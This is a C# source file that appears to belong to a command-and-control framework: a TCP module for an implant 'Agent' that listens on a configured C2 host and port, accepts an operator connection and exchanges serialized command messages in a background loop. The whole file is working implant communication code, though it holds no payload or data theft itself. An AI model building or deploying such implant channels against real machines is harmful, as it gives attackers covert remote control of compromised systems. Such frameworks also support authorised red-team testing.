using System;
using System.Net;
using System.Net.Sockets;
using System.Threading.Tasks;
using System.Collections.Generic;

using C2.Models;

using Agent.Models;
using Agent.Interfaces;
using Agent.Controllers;

namespace Agent.Modules
{
    class TCPCommModule : ICommModule
    {
        protected ConfigController ConfigController { get; set; }
        protected AgentStatus AgentStatus { get; set; }
        protected TcpListener TcpListener { get; set; }
        protected TcpClient TcpClient { get; set; }

        protected Queue<AgentMessage> inboundQueue = new Queue<AgentMessage>();
        protected Queue<AgentMessage> outboundQueue = new Queue<AgentMessage>();

        public void Initialise(ConfigController ConfigController)
        {
            this.ConfigController = ConfigController;
            TcpListener = new TcpListener(IPAddress.Parse((string)ConfigController.GetOption(ConfigurationSettings.C2Host)), (int)ConfigController.GetOption(ConfigurationSettings.C2Port));
        }

        public bool RecvData(out AgentMessage message)
        {
            if (inboundQueue.Count > 0)
            {
                message = inboundQueue.Dequeue();
                return true;
            }

            message = null;
            return false;
        }

        public void SendData(AgentMessage message)
        {
            outboundQueue.Enqueue(message);
        }

        public void Run()
        {
            AgentStatus = AgentStatus.Running;
            TcpListener.Start();
            TcpClient = TcpListener.AcceptTcpClient();
            Task.Factory.StartNew(delegate ()
            {
                while (AgentStatus == AgentStatus.Running)
                {
                    ReadBuffer();
                    WriteBuffer();
                }
            });
        }

        public void Stop()
        {
            TcpListener.Stop();
        }

        private void WriteBuffer()
        {
            var stream = TcpClient.GetStream();

            if (outboundQueue.Count > 0)
            {
                try
                {
                    var messageOut = C2.Helpers.Serialise(outboundQueue.Dequeue());
                    stream.Write(messageOut, 0, messageOut.Length);
                }
                catch { return; }
            }
        }

        private void ReadBuffer()
        {
            var buffer = new byte[TcpClient.ReceiveBufferSize];
            var stream = TcpClient.GetStream();
            stream.ReadTimeout = (int)ConfigController.GetOption(ConfigurationSettings.SleepTime);

            try
            {
                stream.Read(buffer, 0, buffer.Length);
                var data = C2.Helpers.Prune(buffer);
                var messageIn = C2.Helpers.Deserialise<AgentMessage>(data);
                inboundQueue.Enqueue(messageIn);
                Array.Clear(buffer, 0, buffer.Length);
            }
            catch { return; }
        }
    }
}